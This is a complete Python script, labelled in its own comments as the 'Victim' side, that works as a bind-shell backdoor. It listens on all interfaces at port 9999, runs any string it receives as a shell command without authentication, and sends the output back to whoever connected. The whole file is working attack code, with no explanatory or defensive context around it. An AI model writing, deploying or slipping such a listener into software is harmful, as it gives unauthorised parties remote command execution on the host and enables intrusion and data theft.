import socket
import subprocess
import logging

# Victim Configuration
HOST = "0.0.0.0"  # Listen on all available interfaces
PORT = 9999  # Port to listen on

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")


def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        try:
            server_socket.bind((HOST, PORT))
            server_socket.listen(1)
            logging.info(f"Listening on {HOST}:{PORT}")

            while True:
                conn, addr = server_socket.accept()
                logging.info(f"Connection established with {addr}")
                with conn:
                    while True:
                        try:
                            # Receive command
                            command = conn.recv(1024).decode().strip()
                            if not command:
                                logging.info("Empty command received, closing connection.")
                                break

                            logging.info(f"Command received: {command}")

                            # Execute command
                            try:
                                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                                conn.sendall(result)
                            except subprocess.CalledProcessError as e:
                                error_msg = e.output or b"Error executing command."
                                conn.sendall(error_msg)
                                logging.warning(f"Command execution failed: {error_msg.decode()}")

                        except Exception as e:
                            logging.error(f"Error handling command: {e}")
                            break
        except Exception as e:
            logging.error(f"Server error: {e}")
        finally:
            logging.info("Server shutting down.")


if __name__ == "__main__":
    main()
